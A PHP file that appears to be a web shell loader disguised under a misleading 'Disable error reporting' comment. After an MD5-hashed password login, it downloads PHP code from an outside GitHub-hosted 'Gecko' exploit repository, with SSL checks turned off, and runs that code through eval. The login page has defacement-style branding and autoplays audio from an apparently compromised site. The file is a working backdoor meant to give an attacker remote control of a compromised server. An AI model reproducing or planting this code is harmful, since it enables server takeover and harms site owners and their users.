<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['SAP'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}
// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '2d837a268296e69ae018f60221e62b7f'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        echo "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>FORM VIKING WIN</title>
    </head>
    <body>
      <style>
      body {
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: url('https://thecrowdreview.com/wp-content/uploads/2021/09/1632214485_indonesia-stripe-8wAaOq.gif') no-repeat center center fixed;
      background-size: cover;
      color: white;
      font-family: Arial, sans-serif;
      }
      
      form {
      background: rgba(0, 0, 0, 0.7);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
      }
      
      label {
      display: block;
      margin-bottom: 10px;
      }
      
      input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 5px;
      background-color: #f8f8f8;
      color: #333;
      }
      
      input[type="submit"] {
      background-color: #4CAF50;
      color: white;
      cursor: pointer;
      }
      
      input[type="submit"]:hover {
      background-color: #45a049;
      }
      </style>
      </head>
      <body>
      <form method="POST" action="">
      <label for="password"><center><h1>FORM JAKARTA MEET</h1></center></label>
      <input type="password" id="password" name="password">
      <input type="submit" value="Login">
      <audio controls autoplay hidden>
      <source src="https://buzzblendmarketing.com/wp-admin/user/5%20Lagu%20Anime%20Terbaik%202018-2019%20(Album1).mp3" type="audio/mpeg">
      </audio>
      </form>
      </body>
      </html>
      
    <?php
}
?>
